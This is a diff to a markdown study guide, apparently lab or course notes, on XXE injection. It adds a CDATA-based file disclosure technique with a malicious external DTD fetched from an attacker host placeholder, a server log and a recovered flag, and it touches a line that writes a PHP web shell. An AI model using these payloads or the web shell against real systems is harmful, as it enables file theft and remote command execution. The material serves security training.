@@ -22,6 +22,8 @@ This document covers common techniques for identifying and exploiting **web vuln
     - [XML External Entity (XXE) Injection](#xml-external-entity-xxe-injection)
         - [XML Overview](#xml-overview)
         - [Local File Disclosure (LFI)](#local-file-disclosure-lfi)
+        - [Advanced File Disclosure - CDATA](#advanced-file-disclosure---cdata)
+        - [Advanced File Disclosure - Error Based](#advanced-file-disclosure---error-based)
 
 ---
 
@@ -909,7 +911,9 @@ We first create a simple PHP web shell and host it on our attacking machine:
 
 ```bash
 echo '<?php system($_REQUEST["cmd"]); ?>' > shell.php
+```
 
+```bash
 sudo python3 -m http.server 8001
 ```
 
@@ -925,3 +929,75 @@ If successful, this technique downloads the web shell to the back-end server, po
 
 ---
 
+### Advanced File Disclosure - CDATA
+
+In some cases, file contents may not be readable using basic XXE techniques. This can occur when:
+
+- The file contains characters that break XML parsing, or
+- The application does not directly reflect injected entity values
+
+In the previous section, `PHP filter wrappers` were used to base64-encode source code in order to preserve XML syntax. While effective, this approach is limited to environments where such wrappers are available.
+
+An alternative and more flexible technique involves wrapping the contents of an external file inside a `CDATA` section. The `CDATA` construct instructs the XML parser to treat the enclosed content as raw character data, allowing special characters (such as `<`, `>`, and `&`) to be processed without breaking the XML document. This technique can be applied to any file type, not just PHP source code.
+
+**Step 1: Create and Host a Malicious DTD**
+
+We begin by creating a simple external `DTD` file that concatenates multiple entities into a single output:
+
+```bash
+echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
+```
+
+We then host the `DTD` on our attacking machine:
+
+```bash
+python3 -m http.server 8001
+```
+
+**Step 2: Inject CDATA-Based XXE Payload**
+
+Next, we include the following XML entity definitions in the vulnerable request:
+
+```xml
+<!DOCTYPE email [
+  <!ENTITY % begin "<![CDATA[">
+  <!ENTITY % file SYSTEM "file:///flag.php">
+  <!ENTITY % end "]]>">
+  <!ENTITY % xxe SYSTEM "http://OUR_IP:8001/xxe.dtd">
+  %xxe;
+]>
+```
+
+The payload works as follows:
+
+- `%begin` and `%end` define the `CDATA` opening and closing tags
+- `%file` references the target file on the back-end system
+- The external DTD (`xxe.dtd`) combines these entities into a single joined entity
+
+We then reference the constructed entity within the vulnerable `email` element:
+
+```xml
+<email>&joined;</email>
+```
+
+**Step 3: Confirm File Disclosure**
+
+Upon submission, we observe an inbound request to our server, confirming that the external DTD was successfully retrieved:
+
+```
+10.129.234.170 - - [03/Jan/2026 13:56:08] "GET /xxe.dtd HTTP/1.0" 200 -
+```
+
+![Filtered output](images/xxe-advanced3.PNG)
+
+The application returns the contents of the target file, wrapped safely inside a `CDATA` section:
+
+```
+<?php $flag = "HTB{3rr0r5_c4n_l34k_d474}"; ?>
+```
+
+![Filtered output](images/xxe-advanced2.PNG)
+
+---
+
+### Advanced File Disclosure - Error Based
